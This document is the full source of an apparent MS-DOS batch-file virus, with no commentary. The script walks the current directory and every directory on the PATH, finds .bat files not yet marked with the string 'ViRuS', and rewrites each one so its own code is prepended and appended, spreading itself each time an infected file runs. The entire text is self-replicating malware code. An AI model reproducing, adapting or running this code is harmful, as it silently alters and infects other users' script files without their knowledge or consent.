@if '%_virus%==' goto _virus
@if not '%_virus%==' goto ViRuSend
:_virus ViRuS
@echo off%_ViRuS%
if '%1=='ViRuS goto ViRuS%2
set ViRuS=%0.bat
if not exist %ViRuS% set ViRuS=%0
if '%ViRuS%==' set ViRuS=autoexec.bat
set !ViRuS=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist %ViRuS% goto ViRuSfe
call %ViRuS% ViRuS h %path%
if exist %ViRuS% goto ViRuSfe
goto eViRuS
:ViRuSh
shift%_ViRuS%
if '%2==' goto ViRuSend
if exist %2\%ViRuS% set ViRuS=%2\%ViRuS%
if exist %2%ViRuS% set ViRuS=%2%ViRuS%
if exist %2\%ViRuS%.bat set ViRuS=%2\%ViRuS%.bat
if exist %2%ViRuS%.bat set ViRuS=%2%ViRuS%.bat
if not exist %ViRuS% goto ViRuSh
goto ViRuSend
:ViRuSfe
command /e:5000 /c %ViRuS% ViRuS vir . %path%
:eViRuS
call %ViRuS% ViRuS rh
set _virus=>nul.ViRuS
set !ViRuS=
set ViRuS=
goto ViRuSend
:ViRuSrh
set _virus=x%_ViRuS%
%ViRuS% %!ViRuS%
:ViRuSvir
shift%_ViRuS%
if '%2==' exit ViRuS
for %%a in (%2\*.bat %2*.bat) do call %ViRuS% ViRuS i %%a
goto ViRuSvir
:ViRuSi
find "ViRuS"<%3>nul
if not errorlevel 1 goto ViRuSj
echo @if '%%_virus%%==' goto _virus>ViRuS$
type %3>>ViRuS$
echo.>>ViRuS$
find "ViRuS"<%ViRuS%>>ViRuS$
move ViRuS$ %3>nul
set ViRuS#=%ViRuS#%1
if %ViRuS#%==11 exit
:ViRuSj
set ViRuS!=%ViRuS!%1
if %ViRuS!%==11111111 exit
:ViRuSend
